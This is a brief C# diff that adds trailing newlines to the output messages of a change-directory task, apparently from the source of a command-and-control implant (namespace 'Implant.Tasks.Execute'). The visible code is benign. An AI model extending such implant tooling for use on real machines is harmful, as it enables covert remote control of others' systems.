@@ -29,8 +29,8 @@ namespace Implant.Tasks.Execute
 
                 Directory.SetCurrentDirectory(path);
 
-                return $"[*] Path set to {Directory.GetCurrentDirectory()}";
-            } catch (DirectoryNotFoundException) { return $"{path} is not a valid path"; }
+                return $"[*] Path set to {Directory.GetCurrentDirectory()}\n";
+            } catch (DirectoryNotFoundException) { return $"{path} is not a valid path\n"; }
         }
     }
 }
